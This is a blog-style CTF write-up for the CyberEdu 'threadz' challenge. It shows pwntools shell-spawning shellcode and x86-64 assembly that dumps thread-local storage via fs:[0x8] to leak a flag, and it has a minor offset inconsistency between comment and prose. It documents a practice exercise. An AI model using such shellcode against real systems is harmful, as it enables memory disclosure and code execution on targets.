<!DOCTYPE html>
<html lang="en" dir="auto" data-theme="auto">

<head><meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="robots" content="index, follow">
<title>CyberEdu threadz Writeup | Irina&#39;s CTF Writeups</title>
<meta name="keywords" content="CyberEdu, pwn, threads, shellcode">
<meta name="description" content="Challenge overview
Threads are so cool! And secure! So secure that I store all my secrets there
Note 1: The flag is broken into chunks of 4 characters, like this: volatile __thread unsigned int flag1 = &lsquo;{CFT&rsquo;;
The letters in the chunks are reversed for your convenience, and the chunks are defined in order
Note 2: The binary is intentionally not given.
Note 3: The program will read 0x1000 bytes of shellcode, stored into a mmap-ed region with RWX permissions">
<meta name="author" content="">
<link rel="canonical" href="https://irinasusca.github.io/writeup-blog/posts/threadz-writeup/">
<link crossorigin="anonymous" href="/writeup-blog/assets/css/stylesheet.343cc480b9ffc8f04ccbe5e968ad674880cab773ec19905e93033065c1e7a804.css" integrity="sha256-NDzEgLn/yPBMy&#43;XpaK1nSIDKt3PsGZBekwMwZcHnqAQ=" rel="preload stylesheet" as="style">
<link rel="icon" href="https://irinasusca.github.io/writeup-blog/favicon.ico">
<link rel="icon" type="image/png" sizes="16x16" href="https://irinasusca.github.io/writeup-blog/favicon-16x16.png">
<link rel="icon" type="image/png" sizes="32x32" href="https://irinasusca.github.io/writeup-blog/favicon-32x32.png">
<link rel="apple-touch-icon" href="https://irinasusca.github.io/writeup-blog/apple-touch-icon.png">
<link rel="mask-icon" href="https://irinasusca.github.io/writeup-blog/safari-pinned-tab.svg">
<meta name="theme-color" content="#2e2e33">
<meta name="msapplication-TileColor" content="#2e2e33">
<link rel="alternate" hreflang="en" href="https://irinasusca.github.io/writeup-blog/posts/threadz-writeup/">
<noscript>
    <style>
        #theme-toggle,
        .top-link {
            display: none;
        }

    </style>
    <style>
        @media (prefers-color-scheme: dark) {
            :root {
                --theme: rgb(29, 30, 32);
                --entry: rgb(46, 46, 51);
                --primary: rgb(218, 218, 219);
                --secondary: rgb(155, 156, 157);
                --tertiary: rgb(65, 66, 68);
                --content: rgb(196, 196, 197);
                --code-block-bg: rgb(46, 46, 51);
                --code-bg: rgb(55, 56, 62);
                --border: rgb(51, 51, 51);
                color-scheme: dark;
            }

            .list {
                background: var(--theme);
            }

            .toc {
                background: var(--entry);
            }
        }

        @media (prefers-color-scheme: light) {
            .list::-webkit-scrollbar-thumb {
                border-color: var(--code-bg);
            }
        }

    </style>
</noscript>
<script>
    if (localStorage.getItem("pref-theme") === "dark") {
        document.querySelector("html").dataset.theme = 'dark';
    } else if (localStorage.getItem("pref-theme") === "light") {
       document.querySelector("html").dataset.theme = 'light';
    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
        document.querySelector("html").dataset.theme = 'dark';
    } else {
        document.querySelector("html").dataset.theme = 'light';
    }

</script><meta property="og:url" content="https://irinasusca.github.io/writeup-blog/posts/threadz-writeup/">
  <meta property="og:site_name" content="Irina&#39;s CTF Writeups">
  <meta property="og:title" content="CyberEdu threadz Writeup">
  <meta property="og:description" content="Challenge overview Threads are so cool! And secure! So secure that I store all my secrets there
Note 1: The flag is broken into chunks of 4 characters, like this: volatile __thread unsigned int flag1 = ‘{CFT’;
The letters in the chunks are reversed for your convenience, and the chunks are defined in order
Note 2: The binary is intentionally not given.
Note 3: The program will read 0x1000 bytes of shellcode, stored into a mmap-ed region with RWX permissions">
  <meta property="og:locale" content="en-us">
  <meta property="og:type" content="article">
    <meta property="article:section" content="posts">
    <meta property="article:published_time" content="2026-01-04T00:00:00+00:00">
    <meta property="article:modified_time" content="2026-01-04T00:00:00+00:00">
    <meta property="article:tag" content="CyberEdu">
    <meta property="article:tag" content="Pwn">
    <meta property="article:tag" content="Threads">
    <meta property="article:tag" content="Shellcode">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="CyberEdu threadz Writeup">
<meta name="twitter:description" content="Challenge overview
Threads are so cool! And secure! So secure that I store all my secrets there
Note 1: The flag is broken into chunks of 4 characters, like this: volatile __thread unsigned int flag1 = &lsquo;{CFT&rsquo;;
The letters in the chunks are reversed for your convenience, and the chunks are defined in order
Note 2: The binary is intentionally not given.
Note 3: The program will read 0x1000 bytes of shellcode, stored into a mmap-ed region with RWX permissions">


<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BreadcrumbList",
  "itemListElement": [
    {
      "@type": "ListItem",
      "position":  1 ,
      "name": "Posts",
      "item": "https://irinasusca.github.io/writeup-blog/posts/"
    }, 
    {
      "@type": "ListItem",
      "position":  2 ,
      "name": "CyberEdu threadz Writeup",
      "item": "https://irinasusca.github.io/writeup-blog/posts/threadz-writeup/"
    }
  ]
}
</script>
<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "CyberEdu threadz Writeup",
  "name": "CyberEdu threadz Writeup",
  "description": "Challenge overview Threads are so cool! And secure! So secure that I store all my secrets there\nNote 1: The flag is broken into chunks of 4 characters, like this: volatile __thread unsigned int flag1 = \u0026lsquo;{CFT\u0026rsquo;;\nThe letters in the chunks are reversed for your convenience, and the chunks are defined in order\nNote 2: The binary is intentionally not given.\nNote 3: The program will read 0x1000 bytes of shellcode, stored into a mmap-ed region with RWX permissions\n",
  "keywords": [
    "CyberEdu", "pwn", "threads", "shellcode"
  ],
  "articleBody": "Challenge overview Threads are so cool! And secure! So secure that I store all my secrets there\nNote 1: The flag is broken into chunks of 4 characters, like this: volatile __thread unsigned int flag1 = ‘{CFT’;\nThe letters in the chunks are reversed for your convenience, and the chunks are defined in order\nNote 2: The binary is intentionally not given.\nNote 3: The program will read 0x1000 bytes of shellcode, stored into a mmap-ed region with RWX permissions\nAlright, interesting! So we’re blind here. We get 4096 bytes of shellcode to try and figure out the flag.\nIdentifying the vulnerabilities My first attempt was to invoke a shell, but I already suspected it wouldn’t work, because of the interesting flag format.\nshell = asm(shellcraft.sh()) p.recvuntil(b\"!!!\\n\") p.sendline(shell) Our challenge gives us a big hint - that the flag is stored per-thread, not on the stack or heap. So in the TLS (thread local storage). In x86_64 linux that’s the fs: base.\nI didn’t know anything about threads so I solved this challenge with great help from a friend (ChatGPT).\nWhat __thread really means is if, for example, we run __thread unsigned int flag1 = '{CFT';, is every thread would get its own copy of flag1.\nThe CPU has some segment registers, fs and gs. To access thread-local bookkeeping, linux uses fs (and Windows uses gs but who cares about Windows, right?).\nSo fs:0x0 is memory relative to this thread’s TLS base. There’s multiple threads though, each with its own TLS base. And at that base is where the TCB (thread control base) lives, which is just kernel and libc data about the thread. But that’s not thread variables. Which is what we need if you recall.\nInside this TCB, especially at fs:0x8 on amd64 glibc, is a pointer to the DTV (a pointer array, loaded once per module, with TLS data).\n(Except the “flag lives here” is wrong, because it was at DTV + 0x16, so that’s esentially the third thing, probably the binary, don’t know enough about threads to say for sure)\nThen, we cooked this shellcode:\ncontext.os = \"linux\" sc = asm(r\"\"\" /* rbx = dtv */ mov rbx, qword ptr fs:[0x8] /* rsi = dtv[0] (first TLS module) */ mov rsi, [rbx + 16] mov rdi, 1 /* stdout */ mov rdx, 256 /* dump size */ mov rax, 1 /* write */ syscall xor rdi, rdi mov rax, 60 syscall \"\"\") Which does exactly that, prints the third thing pointed to by the DTV. And that was the flag variable!\nThe exploit As always, the full code can be found on my GitHub here.\n",
  "wordCount" : "439",
  "inLanguage": "en",
  "datePublished": "2026-01-04T00:00:00Z",
  "dateModified": "2026-01-04T00:00:00Z",
  "mainEntityOfPage": {
    "@type": "WebPage",
    "@id": "https://irinasusca.github.io/writeup-blog/posts/threadz-writeup/"
  },
  "publisher": {
    "@type": "Organization",
    "name": "Irina's CTF Writeups",
    "logo": {
      "@type": "ImageObject",
      "url": "https://irinasusca.github.io/writeup-blog/favicon.ico"
    }
  }
}
</script>
</head>
<body id="top">
    <header class="header">
    <nav class="nav">
        <div class="logo">
            <a href="https://irinasusca.github.io/writeup-blog/" accesskey="h" title="Irina&#39;s CTF Writeups (Alt + H)">Irina&#39;s CTF Writeups</a>
            <div class="logo-switches">
                <button id="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
                    </svg>
                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <circle cx="12" cy="12" r="5"></circle>
                        <line x1="12" y1="1" x2="12" y2="3"></line>
                        <line x1="12" y1="21" x2="12" y2="23"></line>
                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
                        <line x1="1" y1="12" x2="3" y2="12"></line>
                        <line x1="21" y1="12" x2="23" y2="12"></line>
                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
                    </svg>
                </button>
            </div>
        </div>
        <ul id="menu">
            <li>
                <a href="https://irinasusca.github.io/writeup-blog/" title="Home">
                    <span>Home</span>
                </a>
            </li>
            <li>
                <a href="https://irinasusca.github.io/writeup-blog/posts/" title="Posts">
                    <span>Posts</span>
                </a>
            </li>
            <li>
                <a href="https://irinasusca.github.io/writeup-blog/search/" title="Search (Alt &#43; /)" accesskey=/>
                    <span>Search</span>
                </a>
            </li>
        </ul>
    </nav>
</header>
<main class="main">

<article class="post-single">
  <header class="post-header">
    
    <h1 class="post-title entry-hint-parent">
      CyberEdu threadz Writeup
    </h1>
    <div class="post-meta"><span title='2026-01-04 00:00:00 +0000 UTC'>January 4, 2026</span>

</div>
  </header> <div class="toc">
    <details >
        <summary accesskey="c" title="(Alt + C)">
            <span class="details">Table of Contents</span>
        </summary>

        <div class="inner"><ul>
                <li>
                    <a href="#challenge-overview" aria-label="Challenge overview">Challenge overview</a></li>
                <li>
                    <a href="#identifying-the-vulnerabilities" aria-label="Identifying the vulnerabilities">Identifying the vulnerabilities</a></li>
                <li>
                    <a href="#the-exploit" aria-label="The exploit">The exploit</a>
                </li>
            </ul>
        </div>
    </details>
</div>

  <div class="post-content"><h2 id="challenge-overview">Challenge overview<a hidden class="anchor" aria-hidden="true" href="#challenge-overview">#</a></h2>
<p>Threads are so cool! And secure! So secure that I store all my <strong><a href="https://app.cyber-edu.co/challenges/8f45b420-44a3-11ed-8fdf-1ba87180e9f3?tenant=cyberedu">secrets</a></strong> there</p>
<p>Note 1: The flag is broken into chunks of 4 characters, like this: volatile __thread unsigned int flag1 = &lsquo;{CFT&rsquo;;</p>
<p>The letters in the chunks are reversed for your convenience, and the chunks are defined in order</p>
<p>Note 2: The binary is intentionally not given.</p>
<p>Note 3: The program will read 0x1000 bytes of shellcode, stored into a mmap-ed region with RWX permissions</p>
<hr>
<p>Alright, interesting! So we&rsquo;re blind here. We get 4096 bytes of shellcode to try and figure out the flag.</p>
<hr>
<h2 id="identifying-the-vulnerabilities">Identifying the vulnerabilities<a hidden class="anchor" aria-hidden="true" href="#identifying-the-vulnerabilities">#</a></h2>
<p>My first attempt was to invoke a shell, but I already suspected it wouldn&rsquo;t work, because of the interesting flag format.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>shell <span style="color:#f92672">=</span> asm(shellcraft<span style="color:#f92672">.</span>sh())
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;!!!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(shell)
</span></span></code></pre></div><p>Our challenge gives us a big hint - that the flag is stored per-thread, not on the stack or heap. So in the TLS (thread local storage). In x86_64 linux that&rsquo;s the fs: base.</p>
<p>I didn&rsquo;t know anything about threads so I solved this challenge with great help from a friend (ChatGPT).</p>
<p>What __thread really means is if, for example, we run <code>__thread unsigned int flag1 = '{CFT';</code>, is every thread would get its own copy of flag1.</p>
<p>The CPU has some segment registers, <code>fs</code> and <code>gs</code>. To access thread-local bookkeeping, linux uses <code>fs</code> (and Windows uses <code>gs</code> but who cares about Windows, right?).</p>
<p>So <code>fs:0x0</code> is memory relative to this thread’s TLS base. There&rsquo;s multiple threads though, each with its own TLS base. And at that base is where the TCB (thread control base) lives, which is just kernel and libc data about the thread. But that&rsquo;s not thread variables. Which is what we need if you recall.</p>
<p>Inside this <em>TCB</em>, especially at <code>fs:0x8</code> on amd64 glibc, is a pointer to the <strong>DTV</strong> (a pointer array, loaded once per module, with TLS data).</p>
<p><img alt="challenge-screenshot" loading="lazy" src="/writeup-blog/posts/threadz-writeup/explain.png#center"></p>
<p>(Except the &ldquo;flag lives here&rdquo; is wrong, because it was at DTV + 0x16, so that&rsquo;s esentially the third thing, probably the binary, don&rsquo;t know enough about threads to say for sure)</p>
<p>Then, we cooked this shellcode:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>context<span style="color:#f92672">.</span>os <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;linux&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>sc <span style="color:#f92672">=</span> asm(<span style="color:#e6db74">r</span><span style="color:#e6db74">&#34;&#34;&#34;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    /* rbx = dtv */
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov rbx, qword ptr fs:[0x8]
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    /* rsi = dtv[0] (first TLS module) */
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov rsi, [rbx + 16]
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov rdi, 1          /* stdout */
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov rdx, 256        /* dump size */
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov rax, 1          /* write */
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    syscall
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    xor rdi, rdi
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov rax, 60
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    syscall
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;&#34;&#34;</span>)
</span></span></code></pre></div><p>Which does exactly that, prints the third thing pointed to by the DTV. And that was the flag variable!</p>
<p><img alt="challenge-screenshot" loading="lazy" src="/writeup-blog/posts/threadz-writeup/flag.png#center"></p>
<hr>
<h2 id="the-exploit">The exploit<a hidden class="anchor" aria-hidden="true" href="#the-exploit">#</a></h2>
<hr>
<p>As always, the full code can be found on my GitHub
<strong><a href="https://github.com/irinasusca/ctf-writeups/blob/main/cyberedu/threadz.py">here</a></strong>.</p>


  </div>

  <footer class="post-footer">
    <ul class="post-tags">
      <li><a href="https://irinasusca.github.io/writeup-blog/tags/cyberedu/">CyberEdu</a></li>
      <li><a href="https://irinasusca.github.io/writeup-blog/tags/pwn/">Pwn</a></li>
      <li><a href="https://irinasusca.github.io/writeup-blog/tags/threads/">Threads</a></li>
      <li><a href="https://irinasusca.github.io/writeup-blog/tags/shellcode/">Shellcode</a></li>
    </ul>
  </footer>
</article>
    </main>
    
<footer class="footer">
        <span>&copy; 2026 <a href="https://irinasusca.github.io/writeup-blog/">Irina&#39;s CTF Writeups</a></span> · 

    <span>
        Powered by
        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
    </span>
</footer>
<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
        <path d="M12 6H0l6-6z" />
    </svg>
</a>

<script>
    let menu = document.getElementById('menu');
    if (menu) {
        
        const scrollPosition = localStorage.getItem("menu-scroll-position");
        if (scrollPosition) {
            menu.scrollLeft = parseInt(scrollPosition, 10);
        }
        
        menu.onscroll = function () {
            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
        }
    }

    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
        anchor.addEventListener("click", function (e) {
            e.preventDefault();
            var id = this.getAttribute("href").substr(1);
            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
                    behavior: "smooth"
                });
            } else {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
            }
            if (id === "top") {
                history.replaceState(null, null, " ");
            } else {
                history.pushState(null, null, `#${id}`);
            }
        });
    });

</script>
<script>
    var mybutton = document.getElementById("top-link");
    window.onscroll = function () {
        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
            mybutton.style.visibility = "visible";
            mybutton.style.opacity = "1";
        } else {
            mybutton.style.visibility = "hidden";
            mybutton.style.opacity = "0";
        }
    };

</script>
<script>
    document.getElementById("theme-toggle").addEventListener("click", () => {
        const html = document.querySelector("html");
        if (html.dataset.theme === "dark") {
            html.dataset.theme = 'light';
            localStorage.setItem("pref-theme", 'light');
        } else {
            html.dataset.theme = 'dark';
            localStorage.setItem("pref-theme", 'dark');
        }
    })

</script>
</body>

</html>
